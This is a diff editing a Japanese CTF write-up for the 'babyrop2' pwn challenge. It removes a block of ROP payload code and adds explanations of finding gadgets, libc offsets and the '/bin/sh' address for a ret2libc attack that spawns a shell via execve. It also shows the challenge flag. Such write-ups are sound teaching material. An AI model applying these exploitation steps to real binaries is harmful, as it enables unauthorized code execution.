@@ -189,11 +189,8 @@ io = pwn.remote('problem.harekaze.com', 20005)
 addr_libc_start_main = 0x0000000000020740
 addr_libc_execve = 0x00000000000cc770
 addr_libc_binsh = 0x18cd57
-
-addr_start_main = 0x7ffff7a05ab0
 addr_start_main_got = 0x601028
 addr_main = 0x400540
-
 addr_printf_plt = 0x00000000004004f0
 addr_welcome = 0x400770
 
@@ -249,44 +246,48 @@ HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
 $
 ```
 
-addr_libc_start_main = 0x0000000000020740
-addr_libc_execve = 0x00000000000cc770
-addr_libc_binsh = 0x18cd57
 
-addr_start_main = 0x7ffff7a05ab0
-addr_start_main_got = 0x601028
-addr_main = 0x400540
+### rop_pop_rdi、rop_pop_rsi
 
-addr_printf_plt = 0x00000000004004f0
-addr_welcome = 0x400770
+ROPでそれぞれRDIとRSIに値を設定するためのgadget。
+printfの呼び出しとexecveの呼び出しの両方で利用する。
 
+探すのにはROPgadgetコマンドを使う。
+
+```bash-statement
+$ ROPgadget --binary ./babyrop2
+Gadgets information
+============================================================
+0x0000000000400733 : pop rdi ; ret
+0x0000000000400605 : pop rsi ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
+0x0000000000400731 : pop rsi ; pop r15 ; ret
+```
+
+```plain
 rop_pop_rdi = 0x0000000000400733
 rop_pop_rsi = 0x0000000000400731
-
-s = b"A" * 40
-s += pwn.p64(rop_pop_rdi)
-s += pwn.p64(addr_welcome)
-s += pwn.p64(rop_pop_rsi)
-s += pwn.p64(addr_start_main_got)
-s += pwn.p64(0x0)
-s += pwn.p64(addr_printf_plt)
-s += pwn.p64(addr_main)
-
-io.sendline(s)
-buf = io.recvline()
-print(buf)
-buf = io.recvline()
-print(buf)
-
-addr_start_main= buf[32:38] + b"\x00\x00"
-addr_start_main = pwn.u64(addr_start_main)
-addr_offset = addr_start_main - addr_libc_start_main
-addr_execve = addr_offset + addr_libc_execve
-addr_binsh = addr_offset + addr_libc_binsh
+```
 
 
-### addr_libc_start_main、addr_libc_execve、
-start_main関数とexecveのlibc上でのアドレス。
+### addr_libc_start_main
+start_main関数のlibc上でのアドレス。
+start_main関数がロードされているアドレスからこのアドレスを引くことでlibcがロードされているアドレスを算出することができる。
+
+調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
+
+```bash-statement
+$ objdump -d libc.so.6 | grep start_main
+0000000000020740 <__libc_start_main@@GLIBC_2.2.5>:
+```
+
+```plain
+addr_libc_start_main = 0x0000000000020740
+```
+
+### addr_libc_execve、
+execveのlibc上でのアドレス。
+このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスが分かるのでexecve("/bin/sh")ができる。
+
 調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
 ```bash-statement
@@ -301,12 +302,43 @@ addr_libc_start_main = 0x0000000000020740
 addr_libc_execve = 0x00000000000cc770
 ```
 
+
 ### addr_libc_binsh
 
+libc上で`/bin/sh`が書かれているアドレス。
+最終的にlibcがロードされているアドレスaddr_offsetとこのアドレスを足して`/bin/sh`がロードされているアドレスaddr_binshを算出し、execveに渡す引数として利用する。
+
+stringsコマンドで調べることができる。
+
+```bash-statement
+$ strings -t x libc.so.6 | grep "/bin/sh"
+ 18cd57 /bin/sh
+$
+```
 
 ```plain
 addr_libc_binsh = 0x18cd57
 ```
+
+### 残り
+
+
+addr_start_main_got = 0x601028
+
+addr_main = 0x400540
+
+addr_printf_plt = 0x00000000004004f0
+addr_welcome = 0x400770
+
+rop_pop_rdi = 0x0000000000400733
+rop_pop_rsi = 0x0000000000400731
+
+addr_start_main= buf[32:38] + b"\x00\x00"
+addr_start_main = pwn.u64(addr_start_main)
+addr_offset = addr_start_main - addr_libc_start_main
+addr_execve = addr_offset + addr_libc_execve
+addr_binsh = addr_offset + addr_libc_binsh
+
 
 ## 参考
 
